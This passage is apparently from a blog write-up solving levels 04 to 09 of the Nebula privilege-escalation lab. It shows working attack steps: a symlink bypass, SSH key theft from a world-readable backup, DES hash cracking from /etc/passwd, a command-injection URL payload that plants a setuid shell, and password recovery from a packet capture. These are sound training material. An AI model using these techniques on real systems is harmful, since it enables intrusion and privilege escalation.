  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s [file to read]&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(EXIT_FAILURE);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(strstr(argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;token&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;You may not access &amp;#39;%s&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(EXIT_FAILURE);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;fd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;open(argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;O_RDONLY);&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(fd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;err(EXIT_FAILURE,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Unable to open %s&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;rc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;read(fd,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(buf));&lt;/span&gt;
  
  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(rc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;err(EXIT_FAILURE,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Unable to read fd %d&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fd);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;write(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;rc);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;This code tries to read the &lt;code&gt;token&lt;/code&gt; file which is read/write protected. We can bypass that by creating a symlink to the token and reading that instead.
The token file contains the password for &lt;code&gt;flag04&lt;/code&gt; user.&lt;/p&gt;

&lt;p&gt;

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Symbolic Link Exploit&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7
8&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level04@nebula:/home/flag04$ ln -s  /home/flag04/token /tmp/bypass
level04@nebula:/home/flag04$ ./flag04 /tmp/bypass
06508b5e-8909-4f38-b630-fdb148a848a2
level04@nebula:/home/flag04$ su flag04 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
sh-4.2$ 
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h3 id=&#34;level05:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level05&lt;/h3&gt;

&lt;p&gt;Description:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Check the flag05 home directory. You are looking for weak directory permissions&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This level has world readable backup file which contains the private key for &lt;code&gt;flag05&lt;/code&gt; user. We can use it to ssh in as &lt;code&gt;flag05&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Weak Permissions&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level05@nebula:/home/flag05$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; .backup/
level05@nebula:/home/flag05/.backup$ ls -al
total 2
drwxr-xr-x &lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt; flag05 flag05    &lt;span style=&#34;color: #ae81ff&#34;&gt;42&lt;/span&gt; 2011-11-20 20:13 .
drwxr-x--- &lt;span style=&#34;color: #ae81ff&#34;&gt;4&lt;/span&gt; flag05 level05   &lt;span style=&#34;color: #ae81ff&#34;&gt;93&lt;/span&gt; 2012-08-18 06:56 ..
-rw-rw-r-- &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; flag05 flag05  &lt;span style=&#34;color: #ae81ff&#34;&gt;1826&lt;/span&gt; 2011-11-20 20:13 backup-19072011.tgz
level05@nebula:/home/flag05/.backup$ mkdir /tmp/backup
level05@nebula:/home/flag05/.backup$ cp backup-19072011.tgz /tmp/backup/
level05@nebula:/home/flag05/.backup$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; /tmp/backup/
level05@nebula:/tmp/backup$ tar xvf backup-19072011.tgz 
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:/tmp/backup$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; .ssh
level05@nebula:/tmp/backup/.ssh$ ssh -i id_rsa flag05@localhost
The authenticity of host &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;localhost (127.0.0.1)&amp;#39;&lt;/span&gt; can&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;t be established.&lt;/span&gt;
&lt;span style=&#34;color: #e6db74&#34;&gt;ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.&lt;/span&gt;
&lt;span style=&#34;color: #e6db74&#34;&gt;Are you sure you want to continue connecting (yes/no)? yes&lt;/span&gt;
&lt;span style=&#34;color: #e6db74&#34;&gt;Warning: Permanently added &amp;#39;&lt;/span&gt;localhost&lt;span style=&#34;color: #960050; background-color: #1e0010&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; to the list of known hosts.
flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h3 id=&#34;level06:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level06&lt;/h3&gt;

&lt;p&gt;Description:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The flag06 account credentials came from a legacy unix system.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Upon closer inspection the /etc/passwd file has DES hash for &lt;code&gt;flag06&lt;/code&gt; user:&lt;/p&gt;

&lt;p&gt;

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Password Hash&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level06@nebula:~$ cat /etc/passwd &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
level06@nebula:~$ 
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;The VM itself does not have &lt;code&gt;john&lt;/code&gt; installed, so I cracked the password in my local Kali box (the password was &lt;strong&gt;hello&lt;/strong&gt;) and used it to get the flag:&lt;/p&gt;

&lt;p&gt;

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Flag06&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level06@nebula:~$ su flag06 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
sh-4.2$ 
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h3 id=&#34;level07:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level07&lt;/h3&gt;

&lt;p&gt;Description:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Source Code&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#!/usr/bin/perl&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;use&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;CGI&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;qw{param}&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Content-type: text/html\n\n&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;sub &lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;ping&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;$host&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$_[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;@output&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;`ping -c 3 $host 2&amp;gt;&amp;amp;1`&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;foreach&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$line&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(@output)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;$line&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
  
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #75715e&#34;&gt;# check if Host set. if not, display normal page, etc&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;ping(param(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Host&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;));&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;The vulnerable script is served via thttpd:


&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;THTTPD&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;flag07    &lt;span style=&#34;color: #ae81ff&#34;&gt;1169&lt;/span&gt;  0.0  0.1   &lt;span style=&#34;color: #ae81ff&#34;&gt;2588&lt;/span&gt;   &lt;span style=&#34;color: #ae81ff&#34;&gt;892&lt;/span&gt; ?        Ss   Apr29   0:01 /usr/sbin/thttpd -C /home/flag07/thttpd.conf
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;

And it is running on port 7007.&lt;/p&gt;

&lt;p&gt;The perl source code has a command injection vulnerability. We can inject arbitrary commands into the &lt;code&gt;Host&lt;/code&gt; parameter.
I chose to reuse the setuid shell from previous levels (/tmp/shell).&lt;/p&gt;

&lt;p&gt;The url encoded exploit:
&lt;code&gt;http://192.168.56.101:7007/index.cgi?Host=localhost|cp%20/tmp/shell%20~%20%26%26%20chmod%204755%20~/shell&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Which executes:
&lt;code&gt;cp /tmp/shell ~ &amp;amp;&amp;amp; chmod 4755 ~/shell&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;After that we can grab the flag:


&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Flag07&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7
8
9&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level07@nebula:/home/flag07$ ls -l
total 13
-rwxr-xr-x &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; root   root    &lt;span style=&#34;color: #ae81ff&#34;&gt;368&lt;/span&gt; 2011-11-20 21:22 index.cgi
-rwsr-xr-x &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; flag07 flag07 &lt;span style=&#34;color: #ae81ff&#34;&gt;7322&lt;/span&gt; 2016-04-30 06:41 shell
-rw-r--r-- &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; root   root   &lt;span style=&#34;color: #ae81ff&#34;&gt;3719&lt;/span&gt; 2011-11-20 21:22 thttpd.conf
level07@nebula:/home/flag07$ ./shell
flag07@nebula:/home/flag07$ getflag 
You have successfully executed getflag on a target account
flag07@nebula:/home/flag07$ 
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h3 id=&#34;level08:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level08&lt;/h3&gt;

&lt;p&gt;Description:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;World readable files strike again. Check what that user was up to, and use it to log into flag08 account.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This level has a world readable capture.pcap file in flag08&amp;rsquo;s home folder. After SCPing it out and viewing it in wireshark,
we can extract the plaintext password:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/05/01/wireshark.png&#34; alt=&#34;wireshark&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The password seen in the screenshot is &lt;code&gt;backdoor...00Rm8.ate&lt;/code&gt;, hoewever, the dots here are actually &lt;code&gt;0x7F&lt;/code&gt; characters (which is Backspace),
so the correct password is &lt;code&gt;backd00Rmate&lt;/code&gt;
With this password we can get the flag:&lt;/p&gt;

&lt;p&gt;

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Flag08&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level08@nebula:/home/flag08$ su flag08 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
sh-4.2$ 
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h3 id=&#34;level09:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level09&lt;/h3&gt;

&lt;p&gt;Description:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There’s a C setuid wrapper for some vulnerable PHP code…&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Source Code&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;spam&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;($email)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;$email&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;preg_replace(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/\./&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot; dot &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$email);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;$email&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;preg_replace(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/@/&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot; AT &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$email);&lt;/span&gt;
  
  &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$email;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;markup&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;($filename,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$use_me)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;$contents&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;file_get_contents($filename);&lt;/span&gt;

